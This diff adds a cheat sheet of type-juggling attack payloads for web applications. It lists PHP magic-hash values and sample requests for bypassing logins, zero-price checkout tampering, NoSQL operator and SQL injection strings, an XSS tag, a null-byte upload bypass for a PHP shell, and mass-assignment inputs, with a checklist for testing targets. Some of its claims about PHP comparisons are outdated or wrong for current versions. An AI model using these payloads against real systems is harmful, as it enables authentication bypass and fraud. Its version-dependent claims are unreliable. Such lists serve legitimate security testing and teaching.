@@ -1,0 +1,349 @@
+# Type Juggling Payloads
+
+## ========================================
+## PHP TYPE JUGGLING
+## ========================================
+
+# Loose comparison (==)
+"0" == 0          → true
+"0e123" == "0e456" → true (scientific notation)
+"0e123" == 0      → true
+null == 0         → true
+false == 0        → true
+true == 1         → true
+
+# String to integer
+"123abc" == 123   → true
+"abc" == 0        → true
+
+## ========================================
+## AUTHENTICATION BYPASS
+## ========================================
+
+# Magic hash bypass
+password: 0e123456789
+# If MD5/SHA1 hash starts with 0e, treated as 0
+
+# Common magic hashes
+MD5: 240610708
+SHA1: 10932435112
+
+# JSON boolean bypass
+{"admin": true} vs {"admin": "true"}
+
+## ========================================
+## PHP MAGIC HASHES
+## ========================================
+
+# MD5 magic hashes
+240610708        → 0e462097431906509019562988736854
+QNKCDZO          → 0e830400451993494058024219903391
+s878926199a      → 0e545993274517709034328855841020
+s155964671a      → 0e342768416822451524974117254469
+
+# SHA1 magic hashes
+10932435112      → 0e07766915004133176347055865026311692244
+aaroZmOk         → 0e66507019969427134894567494305185566735
+aaK1STfY         → 0e76658526655756207688271159624026011393
+
+## ========================================
+## LOOSE COMPARISON BYPASS
+## ========================================
+
+# Bypass password check
+if ($password == $hash) {
+  // Login
+}
+
+# Attack
+password: 0
+hash: 0e123... (magic hash)
+Result: 0 == 0 → true
+
+## ========================================
+## JSON TYPE CONFUSION
+## ========================================
+
+# Boolean vs string
+{"admin": true}   → admin = boolean true
+{"admin": "true"} → admin = string "true"
+
+# Number vs string
+{"id": 123}   → id = integer
+{"id": "123"} → id = string
+
+## ========================================
+## ARRAY MANIPULATION
+## ========================================
+
+# Array vs string
+{"param": "value"}
+{"param": ["value"]}
+
+# Empty array
+[] == false → true (PHP)
+[] == 0 → true (PHP)
+
+## ========================================
+## NULL BYTE INJECTION
+## ========================================
+
+# String termination
+"admin\x00user" truncated to "admin"
+
+# File extension bypass
+shell.php\x00.jpg
+
+## ========================================
+## STRICT VS LOOSE COMPARISON
+## ========================================
+
+# Loose (==)
+"123" == 123 → true
+"0e1" == 0 → true
+
+# Strict (===)
+"123" === 123 → false
+"0e1" === 0 → false
+
+## ========================================
+## SQL INJECTION VIA TYPE JUGGLING
+## ========================================
+
+# Parameter manipulation
+id=1 → WHERE id = 1
+id=1' → WHERE id = '1'
+
+# Boolean bypass
+admin=true → WHERE admin = 1
+admin=false → WHERE admin = 0
+
+## ========================================
+## NOSQL TYPE CONFUSION
+## ========================================
+
+# MongoDB
+{"username": "admin", "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+
+# Type confusion
+{"price": 0} vs {"price": "0"}
+
+## ========================================
+## JAVASCRIPT TYPE COERCION
+## ========================================
+
+# Truthy/Falsy
+"0" → truthy
+0 → falsy
+[] → truthy
+null → falsy
+
+# Comparison quirks
+[] == ![] → true
+[] == 0 → true
+"" == 0 → true
+
+## ========================================
+## PYTHON TYPE ISSUES
+## ========================================
+
+# Boolean from string
+bool("False") → True
+bool("0") → True
+bool("") → False
+
+# Integer comparison
+"123" == 123 → False (strict typing)
+
+## ========================================
+## RUBY TYPE CONVERSION
+## ========================================
+
+# to_i conversion
+"123abc".to_i → 123
+"abc".to_i → 0
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Login bypass
+POST /login
+username=admin&password=240610708
+
+# Server code
+$hash = md5($password);
+if ($hash == $stored_hash) { // Loose comparison
+  login_user();
+}
+
+# Example 2: Price manipulation
+POST /checkout
+{"price": 0, "product_id": 123}
+
+# Server code
+if ($price == 0) { // Loose, 0 == "0" == false
+  free_product();
+}
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Pattern 1: Hash comparison
+if (md5($input) == $hash) { }
+
+# Pattern 2: Boolean check
+if ($admin == true) { }
+
+# Pattern 3: Numeric check
+if ($price == 0) { }
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify comparison operations
+Look for ==, !=
+
+# 2. Test type variations
+Send different types for same parameter
+
+# 3. Test magic hashes
+Use known magic hash values
+
+# 4. Test array/object types
+Send arrays instead of strings
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Boolean bypass
+admin=true (boolean)
+admin=1 (integer)
+admin="1" (string)
+
+# Numeric bypass
+price=0 (integer)
+price="0" (string)
+price=0.0 (float)
+
+# Array bypass
+id=1
+id[]=1
+id={"value": 1}
+
+## ========================================
+## PHP SPECIFIC
+## ========================================
+
+# String to number
+"10 apples" + 5 = 15
+"apples" + 5 = 5
+
+# Null comparisons
+null == 0 → true
+null == "" → true
+null == false → true
+
+## ========================================
+## COMMON INJECTION POINTS
+## ========================================
+
+# Login forms
+username/password fields
+
+# API parameters
+JSON payloads
+
+# Search functionality
+Query parameters
+
+# Price fields
+E-commerce checkout
+
+## ========================================
+## MAGIC HASH GENERATION
+## ========================================
+
+# Find MD5 magic hashes
+for i in range(10000000, 99999999):
+    h = hashlib.md5(str(i).encode()).hexdigest()
+    if h.startswith('0e') and h[2:].isdigit():
+        print(f"{i} → {h}")
+
+## ========================================
+## PROTECTION BYPASS
+## ========================================
+
+# If === is used inconsistently
+Some checks use ===
+Others use ==
+Exploit the weak ones
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Manual testing
+Burp Suite Repeater
+
+# Type confusion payloads
+Lists of magic hashes
+Type variation scripts
+
+# Automated
+Custom scripts to test types
+
+## ========================================
+## REAL-WORLD VULNERABILITIES
+## ========================================
+
+# CVE-2015-2166 (FluxBB)
+Password reset using type juggling
+
+# CVE-2012-3527 (vBulletin)
+Authentication bypass via magic hash
+
+## ========================================
+## COMBINATION ATTACKS
+## ========================================
+
+# Type juggling + SQL injection
+{"id": "1' OR '1'='1"}
+
+# Type juggling + XSS
+{"msg": "<script>alert(1)</script>"}
+
+# Type juggling + Mass assignment
+{"role": "admin", "verified": true}
+
+## ========================================
+## LANGUAGE-SPECIFIC PAYLOADS
+## ========================================
+
+# PHP
+password: 240610708 (MD5 magic hash)
+
+# Python
+admin: "True" (string vs bool)
+
+# JavaScript
+price: "0" (string vs number)
+
+# Ruby
+amount: "123abc" (converts to 123)
+
+## ========================================
+## CHECKLIST
+## ========================================
+
+- [ ] Test loose vs strict comparison
+- [ ] Try magic hash values
+- [ ] Send different types
+- [ ] Test array manipulation
+- [ ] Test boolean conversion
+- [ ] Test null comparisons
+- [ ] Test scientific notation
